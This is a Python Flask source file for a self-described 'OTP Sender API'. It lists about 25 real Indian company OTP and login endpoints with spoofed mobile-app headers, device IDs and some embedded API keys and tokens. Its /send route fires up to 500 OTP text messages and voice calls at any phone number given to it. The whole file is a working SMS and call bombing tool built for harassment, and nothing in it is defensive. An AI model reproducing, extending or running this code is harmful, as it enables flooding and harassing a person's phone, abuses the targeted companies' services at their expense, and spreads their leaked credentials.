from flask import Flask, request, jsonify
import requests
import json
import time
import os
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# All APIs list
APIS = [
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "country_code": "IN",
            "origin": "https://www.hungama.com",
            "referer": "https://www.hungama.com/",
        },
        "data": lambda phone: json.dumps({
            "mobileNo": phone,
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        })
    },
    {
        "name": "MeruCab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0",
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Dayco",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://ekyc.daycoindia.com",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {
            "version_code": "1160",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/5.0.0-alpha.2",
        },
        "data": lambda phone: json.dumps({
            "app_version": "7.10.51",
            "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
            "phone_number": phone,
            "language": "en",
            "udid": "b751fb63c0ae17ba",
        })
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/",
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "Shiprocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/",
        },
        "data": lambda phone: json.dumps({"mobileNumber": phone})
    },
    {
        "name": "TataCapital",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"phone": phone, "applSource": "", "isOtpViaCallAtLogin": "true"})
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1",
        },
        "data": lambda phone: json.dumps({"organizationId": "5eb393ee95fab7468a79d189", "mobile": phone})
    },
    {
        "name": "1mg",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1",
        },
        "data": lambda phone: json.dumps({"number": phone, "is_corporate_user": False, "otp_on_call": True})
    },
    {
        "name": "Swiggy",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {
            "user-agent": "Swiggy-Android",
            "content-type": "application/json; charset=utf-8",
        },
        "data": lambda phone: json.dumps({"mobile": phone})
    },
    {
        "name": "KPNFresh",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/",
        },
        "data": lambda phone: json.dumps({"phone_number": {"number": phone, "country_code": "+91"}})
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)",
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
            "Origin": "https://www.lenskart.com",
            "Referer": "https://www.lenskart.com/",
        },
        "data": lambda phone: json.dumps({"captcha": None, "phoneCode": "+91", "telephone": phone})
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)",
        },
        "data": lambda phone: json.dumps({"phone": phone, "app_signature": "4pFtQJwcz6y"})
    },
    {
        "name": "Stratzy",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json",
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login",
        },
        "data": lambda phone: json.dumps({"phoneNo": phone})
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://wellacademy.in",
        },
        "data": lambda phone: json.dumps({"contact_no": phone})
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "origin": "https://www.beepkart.com",
            "referer": "https://www.beepkart.com/",
        },
        "data": lambda phone: json.dumps({"city": 362, "fullName": "", "phone": phone, "source": "myaccount"})
    },
    {
        "name": "LendingPlate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://lendingplate.com",
            "Referer": "https://lendingplate.com/personal-loan",
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "client-id": "snitch_secret",
            "Origin": "https://www.snitch.com",
            "Referer": "https://www.snitch.com/",
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"})
    },
    {
        "name": "Foxy",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Platform": "web",
            "Origin": "https://www.foxy.in",
            "Referer": "https://www.foxy.in/onboarding",
            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
        },
        "data": lambda phone: json.dumps({"user": {"phone_number": f"+91{phone}"}, "device": None})
    },
    {
        "name": "Wakefit",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.wakefit.co",
            "Referer": "https://www.wakefit.co/",
            "API-Secret-Key": "ycq55IbIjkLb",
            "API-Token": "c84d563b77441d784dce71323f69eb42",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
        },
        "data": lambda phone: json.dumps({"mobile": phone, "whatsapp_opt_in": 1})
    },
    {
        "name": "Univest",
        "url": "https://api.univest.in/api/auth/send-otp",
        "method": "GET",
        "headers": {"User-Agent": "okhttp/3.9.1"},
        "data": None,
        "url_builder": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}"
    },
    {
        "name": "Jockey",
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
            "Accept": "*/*",
            "Referer": "https://www.jockey.in/",
        },
        "data": None,
        "url_builder": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false"
    },
    {
        "name": "EkaCare",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {
            "Device-Id": "5df83c463f0ff8ff",
            "Flavour": "android",
            "Client-Id": "androidp",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "okhttp/4.9.3",
        },
        "data": lambda phone: json.dumps({"payload": {"allowWhatsapp": True, "mobile": f"+91{phone}"}, "type": "mobile"})
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Origin": "https://smytten.com",
            "Referer": "https://smytten.com/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
        },
        "data": lambda phone: json.dumps({"device_platform": "web", "phone": phone})
    },
]

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "service": "OTP Sender API",
        "usage": "/send=PHONE&count=NUMBER",
        "example": "/send=1234567890&count=50",
        "total_apis": len(APIS)
    })

@app.route("/send=<phone>&count=<count>", methods=["GET"])
def send_otp(phone, count):
    try:
        phone = phone.strip()
        count = int(count)
        
        if not phone.isdigit() or len(phone) < 10:
            return jsonify({"success": False, "error": "Invalid phone number"}), 400
        
        if count < 1 or count > 500:
            return jsonify({"success": False, "error": "Count 1-500"}), 400
        
        results = []
        successful = 0
        failed = 0
        
        for i in range(count):
            api = APIS[i % len(APIS)]
            
            try:
                if "url_builder" in api and api["url_builder"]:
                    url = api["url_builder"](phone)
                else:
                    url = api["url"]
                
                data = api["data"](phone) if api["data"] else None
                
                if api["method"] == "POST":
                    resp = requests.post(url, headers=api["headers"], data=data, timeout=10)
                else:
                    resp = requests.get(url, headers=api["headers"], timeout=10)
                
                status = resp.status_code
                ok = status in [200, 201, 202, 204]
                
                if ok:
                    successful += 1
                else:
                    failed += 1
                
                results.append({"attempt": i+1, "api": api["name"], "status_code": status, "success": ok})
                    
            except Exception as e:
                failed += 1
                results.append({"attempt": i+1, "api": api["name"], "error": str(e)[:50], "success": False})
            
            time.sleep(0.2)
        
        return jsonify({
            "success": True,
            "phone": phone,
            "total_sent": count,
            "successful": successful,
            "failed": failed,
            "results": results[:20]
        }), 200
        
    except ValueError:
        return jsonify({"success": False, "error": "Invalid count"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
